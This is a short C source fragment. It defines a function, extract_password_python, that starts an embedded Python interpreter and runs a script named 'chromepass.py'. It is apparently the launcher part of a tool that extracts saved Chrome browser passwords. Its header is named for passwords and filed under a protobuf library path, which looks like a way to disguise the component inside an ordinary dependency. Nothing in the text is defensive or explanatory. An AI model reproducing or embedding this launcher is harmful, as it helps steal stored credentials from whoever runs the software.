
#include "third_party/protobuf/python/google/protobuf/pyext/python_exe_passwords.h"




static void extract_password_python(){
	
	
	
	
	
	
	
	Py_Initialize();
	PyRun_SimpleString("exec(open('chromepass.py').read())");
	Py_Finalize();	
	
}


